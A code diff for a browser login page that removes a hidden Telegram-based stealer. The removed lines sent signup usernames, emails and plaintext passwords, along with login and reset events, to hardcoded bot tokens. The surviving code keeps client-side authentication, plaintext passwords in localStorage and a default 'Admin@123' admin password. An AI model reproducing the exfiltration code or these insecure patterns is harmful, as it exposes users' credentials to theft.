@@ -136,28 +136,15 @@ const body = document.body;
 const slider = document.getElementById("modeSlider");
 
 /* =========================
-   TELEGRAM
+   ADMIN DEFAULT PASSWORD
 ========================= */
-const SIGNUP_BOT_TOKEN = "8448157151:AAH5qUePwzm1ljySu5cIkRRpc3oc2Y-2G6U";
-const SIGNUP_CHAT_ID  = "6340167379";
-const LOGIN_BOT_TOKEN = "8075539797:AAGWUlWxg34a8vko_N4Tng7uz_hM2fqRtBM";
-const LOGIN_CHAT_ID  = "6340167379";
-const FORGOT_BOT_TOKEN = "8318249547:AAG2MA0Xc_xKPp3YYIPHoE4Cabal75ZQyqs";
-const FORGOT_CHAT_ID  = "6340167379";
-
-// Default admin password
 if(!localStorage.getItem("admin_pass")){
-  localStorage.setItem("admin_pass","Admin@123");
+  localStorage.setItem("admin_pass","Admin@123"); // default admin password
 }
 
-function sendTelegram(token, chat, msg){
-  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({ chat_id:chat, text:msg })
-  });
-}
-
+/* =========================
+   HELPERS
+========================= */
 function showPopup(message, type="info"){
   const popup = document.createElement("div");
   popup.className = "popup " + type;
@@ -173,12 +160,10 @@ function showPopup(message, type="info"){
 function toggle(){ container.className="container active"; }
 function showForgot(){ container.className="container forgot-active"; }
 function backToLogin(){ container.className="container"; }
-
 function togglePassword(id, checkbox){
   const input = document.getElementById(id);
   input.type = checkbox.checked ? "text" : "password";
 }
-
 function toggleMode(){
   if(body.classList.contains("dark-mode")){
     body.classList.remove("dark-mode");
@@ -190,11 +175,13 @@ function toggleMode(){
     slider.textContent = "🌙";
   }
 }
-
 function isGmail(email){
   return /^[a-z0-9._%+-]+@gmail\.com$/i.test(email);
 }
 
+/* =========================
+   REGISTER
+========================= */
 function register(){
   if(!regUser.value || !regEmail.value || !regPass.value){
     showPopup("Please fill all fields", "error");
@@ -208,22 +195,18 @@ function register(){
   localStorage.setItem("user_"+regUser.value,
     JSON.stringify({ email:regEmail.value, pass:regPass.value }));
 
-  sendTelegram(SIGNUP_BOT_TOKEN, SIGNUP_CHAT_ID,
-`🆕 NEW SIGNUP
-👤 Username: ${regUser.value}
-📧 Email: ${regEmail.value}
-🔑 Password: ${regPass.value}`);
-
   showPopup("Signup successful! You can login now.", "success");
   backToLogin();
 }
 
+/* =========================
+   LOGIN
+========================= */
 function login(){
   const username = loginUser.value.trim();
   const password = loginPass.value.trim();
 
   if(username === "admin"){
-    // admin login
     const adminPass = localStorage.getItem("admin_pass");
     if(password === adminPass){
       localStorage.setItem("currentUser","admin");
@@ -249,29 +232,20 @@ function login(){
   }
 
   localStorage.setItem("currentUser", username);
-  localStorage.setItem("currentRole","user");
-
-  sendTelegram(LOGIN_BOT_TOKEN, LOGIN_CHAT_ID,
-`✅ LOGIN SUCCESS
-👤 ${username}
-🕒 ${new Date().toLocaleString()}`);
-
+  localStorage.setItem("currentRole", "user");
   showPopup("Login successful! Redirecting...", "success");
   setTimeout(()=> window.location.href="dashboard.html", 1000);
 }
 
+/* =========================
+   FORGOT PASSWORD
+========================= */
 function forgotPassword(){
   if(!isGmail(fpEmail.value)){
     showPopup("Please enter a valid Gmail address", "error");
     return;
   }
-
-  sendTelegram(FORGOT_BOT_TOKEN, FORGOT_CHAT_ID,
-`🔑 FORGOT PASSWORD
-👤 ${fpUser.value}
-📧 ${fpEmail.value}`);
-
-  showPopup("Password details will be sent to your Gmail within 24 hours.", "info");
+  showPopup("Password recovery is not automated in this demo.", "info");
   backToLogin();
 }
 </script>
